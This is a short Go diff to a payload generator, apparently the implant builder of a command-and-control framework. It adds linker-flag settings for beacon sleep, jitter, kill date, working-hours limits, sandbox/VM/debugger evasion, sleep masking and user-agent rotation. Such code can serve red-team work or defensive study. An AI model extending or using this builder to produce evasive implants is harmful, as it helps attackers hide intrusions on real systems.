@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"time"
 )
 
@@ -122,6 +123,21 @@ func (g *Generator) Build(cfg *Config) (*Result, error) {
 	ldflags := "-X main.serverURL=" + cfg.ServerURL +
 		" -X main.encKey=" + cfg.EncKey +
 		" -X main.secondaryKey=" + cfg.SecondaryKey
+
+	if cfg.Profile != nil {
+		p := cfg.Profile
+		ldflags += " -X main.defaultInterval=" + strconv.FormatInt(int64(p.SleepInterval.Seconds()), 10)
+		ldflags += " -X main.defaultJitter=" + strconv.Itoa(p.JitterPercent)
+		ldflags += " -X main.defaultMaxRetries=" + strconv.Itoa(p.MaxRetries)
+		ldflags += " -X main.defaultKillDate=" + p.KillDate
+		ldflags += " -X main.defaultWorkingHoursOnly=" + strconv.FormatBool(p.WorkingHoursOnly)
+		ldflags += " -X main.defaultWorkingHoursStart=" + strconv.Itoa(p.WorkingHoursStart)
+		ldflags += " -X main.defaultWorkingHoursEnd=" + strconv.Itoa(p.WorkingHoursEnd)
+		ldflags += " -X main.defaultEnableEvasion=" + strconv.FormatBool(
+			p.EnableSandboxCheck || p.EnableVMCheck || p.EnableDebugCheck)
+		ldflags += " -X main.defaultSleepMasking=" + strconv.FormatBool(p.SleepMasking)
+		ldflags += " -X main.defaultUserAgentRotation=" + strconv.FormatBool(p.UserAgentRotation)
+	}
 
 	if cfg.StripSyms {
 		ldflags += " -s -w"
